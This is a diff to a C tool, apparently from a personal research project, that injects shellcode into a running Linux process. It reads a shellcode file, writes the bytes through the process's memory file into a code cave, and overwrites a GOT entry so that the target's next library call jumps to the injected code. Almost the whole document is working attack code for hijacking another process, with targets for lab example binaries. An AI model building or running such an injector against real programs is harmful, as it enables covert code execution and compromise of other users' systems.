@@ -5,6 +5,7 @@
 #include <unistd.h>
 #include <errno.h>
 #include <elf.h>
+#include <sys/stat.h>
 
 #define COUNT 20
 #define GOTMAX 20
@@ -21,18 +22,15 @@ typedef struct got_table {
   int count;
 } got_table;
 
-void overwrite_got_entry(got_table* table, int overwrite, int* fd_mem) {
-  // Only support little endian for now
-  //char* write_val = "\xef\xbe\xad\xde\xbe\xba\xfe\xca"; // TODO: Change this obvs, when we are ready
-  char* write_val = "\x69\x62\xcc\xba\x0d\x56\x00\x00"; // This value is a test specifically for my ASLR-enabled run of example_2. Will not be transferable
+void overwrite_got_entry(got_table* table, int overwrite, unsigned long* code_cave, int* fd_mem) {
   printf("Attempting to overwrite %p -> %p\n",
       (void*)*table->entries[overwrite]->addr,
       (void*)*table->entries[overwrite]->val); 
 
   lseek(*fd_mem, *table->entries[overwrite]->addr, SEEK_SET);
 
-  int write_result = write(*fd_mem, write_val, 0x8);
-  if (write_result != strlen(write_val)) {
+  int write_result = write(*fd_mem, code_cave, 0x8);
+  if (write_result != 0x8) {
     printf("Something went wrong...\n");
     printf("You very likely broke the binary...\n");
     printf("Grab your bug out bag and GTFO!\n");
@@ -203,19 +201,43 @@ char* get_base_addr(int* pid) {
   return addr;
 }
 
+void write_to_cave(unsigned long* code_cave, char* shell_code, int* size, int* fd_mem) {
+  lseek(*fd_mem, *code_cave, SEEK_SET);
+  write(*fd_mem, shell_code, *size);
+
+  free(size);
+
+  return;
+}
+
 int main(int argc, char** argv) {
-  if (argc != 3) {
-    printf("Usage: %s <pid> <code cave offset>\n", argv[0]); // code cave offset for example_3 is 4745
+  if (argc != 4) {
+    printf("Usage: %s <pid> <code cave offset> <shellcode file>\n", argv[0]); // code cave offset for example_3 is 4745
     return 1;
   }
 
+  /**************************************************************
+   * Order of operations:
+   *
+   * 1. Confirm the target PID exists and read the "maps" file
+   * 2. Get the Base Address
+   * 3. Calculate the code cave
+   * 4. Parse the ELF
+   * 5. Grab the GOT
+   * 6. Write to the code cave
+   * 7. If all has gone well... overwrite the GOT entry and exit
+   *
+   **************************************************************/
+
+  /*
+   * Validate and parse args
+   */
   int* pid = malloc(sizeof(int));
   *pid = strtol(argv[1], NULL, 10);
   if (errno == ERANGE || errno == EINVAL || *pid == 0) {
     printf("Something went wrong with the PID you entered...\n");
     return 1;
   }
-  printf("PID is good...\n");
 
   unsigned long* cave_offset = malloc(sizeof(unsigned long));
   *cave_offset = strtoul(argv[2], NULL, 10);
@@ -224,22 +246,52 @@ int main(int argc, char** argv) {
     return 1;
   }
 
-  unsigned long* addr = malloc(sizeof(unsigned long));
+  struct stat st;
+  stat(argv[3], &st);
+
+  int* sc_size = malloc(sizeof(int));
+  *sc_size = st.st_size;
+
+  char* shell_code = malloc(*sc_size);
+
+  int *fd_sc = malloc(sizeof(int));
+  *fd_sc = open(argv[3], O_RDONLY);
+  if (*fd_sc == -1) {
+    printf("Something went wrong opening the shellcode file...\n");
+    return 1;
+  }
+
+  read(*fd_sc, shell_code, *sc_size);
+  free(fd_sc);
+
+  /*
+   * Steps 1 and 2
+   */
   char* base_addr = get_base_addr(pid);
 
+  unsigned long* addr = malloc(sizeof(unsigned long));
   *addr = strtoul(base_addr, NULL, 16);
   if (errno == ERANGE || errno == EINVAL || *addr == 0) {
     printf("Something went wrong converting the base addr from a string...\n");
     return 1;
   }
 
+  /*
+   * Step 3
+   */
   unsigned long* code_cave = malloc(sizeof(unsigned long));
   *code_cave = *addr + *cave_offset;
 
+  /*
+   * Step 4
+   */
   Elf64_Addr* got = malloc(sizeof(Elf64_Addr)); // Ptr to GOT addr (not actual GOT in ELF)
   int* fd_mem = malloc(sizeof(int)); // Descriptor to ELF
   *got = parse_elf(pid, addr, fd_mem);
 
+  /*
+   * Step 5
+   */
   // If you have made it this far, we need the table for GOT entries
   got_table* table = (got_table*)malloc(sizeof(got_table));
   if (table == NULL) {
@@ -251,9 +303,17 @@ int main(int argc, char** argv) {
   populate_got_table(table, got, fd_mem);
   read_got_table(table);
 
+  /*
+   * Step 6
+   */
+  write_to_cave(code_cave, shell_code, sc_size, fd_mem);
+
+  /*
+   * Step 7
+   */
   // TODO: For now, we overwrite the GOT table manually
-  int overwrite = 6; // Entry to overwrite (manually, for now)
-  overwrite_got_entry(table, overwrite, fd_mem);
+  int overwrite = 9; // Entry to overwrite (manually, for now)
+  overwrite_got_entry(table, overwrite, code_cave, fd_mem);
 
   free(fd_mem);
 
